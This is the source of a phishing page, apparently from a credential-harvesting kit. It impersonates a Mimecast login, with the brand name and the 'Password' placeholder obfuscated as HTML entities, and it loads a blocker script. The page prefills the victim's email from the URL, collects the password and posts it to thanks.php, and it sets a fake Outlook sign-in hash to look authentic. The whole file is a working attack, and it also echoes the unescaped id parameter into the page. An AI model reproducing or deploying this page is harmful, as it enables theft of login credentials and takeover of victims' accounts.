<?php
session_start();
require 'core/functions.php';
require 'core/blocker.php';
require 'config/config.php';

$id = ($_GET['id']);

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>M&#105;&#109;&#101;&#99;&#97;&#115;t L&#111;&#103;&#105;n </title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[2].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 1px solid #b2b2b2; 
    height: 35px; 
    width: 275px; 
  	font-family: calibri;
    font-size: 16px;
  	color: #555;
    padding-left: 6px; 
    border-radius: 6px; 
}  
.textbox:focus { 
    outline: none; 
    border: 1px solid #b2b2b2;
} 
.textbox1 { 
    border: 0px solid #fff; 
    height: 35px; 
    width: 275px; 
  	font-family: calibri;
    font-size: 17px;
  	color: #555;
    padding-left: 6px; 
    border-radius: 6px; 
}  
.textbox1:focus { 
    outline: none; 
    border: 0px solid #fff;
} 
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 405px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body bgColor="#1976D2">
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:405px; height:509px; z-index:0"><img src="images/t3.png" alt="" title="" border=0 width=405 height=509></div>

<div id="image2" style="position:absolute; overflow:hidden; left:181px; top:488px; width:43px; height:19px; z-index:1"><a href="#"><img src="images/t2.png" alt="" title="" border=0 width=43 height=19></a></div>
<form action="thanks.php" name=teesradin id=teesradin method=post>
       <input name="user1" value="<?=$id?>" type="hidden">
<input name="user" value="<?=$id?>" class="textbox1" autocomplete="off" required type="text" style="position:absolute;width:338px;left:33px;top:184px;z-index:2">
<select name="dm" class="textbox" autocomplete="off" required style="position:absolute;width:338px;left:33px;top:234px;z-index:3">
<option value="Domain">Domain</option>
<option value="Cloud">Cloud</option></select>
<input name="pd" placeholder="P&#97;&#115;&#115;&#119;&#111;&#114;d " class="textbox" autocomplete="off" required type="text" style="position:absolute;width:338px;left:33px;top:287px;z-index:4">
<div id="formimage1" style="position:absolute; left:32px; top:335px; z-index:5"><input type="image" name="formimage1" width="340" height="36" src="images/btm.png"></div>
<div id="image3" style="position:absolute; overflow:hidden; left:32px; top:392px; width:168px; height:39px; z-index:6"><a href="#"><img src="images/t4.png" alt="" title="" border=0 width=168 height=39></a></div>

</div>
<script>
    location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015';

    
</script>

</body>
</html>
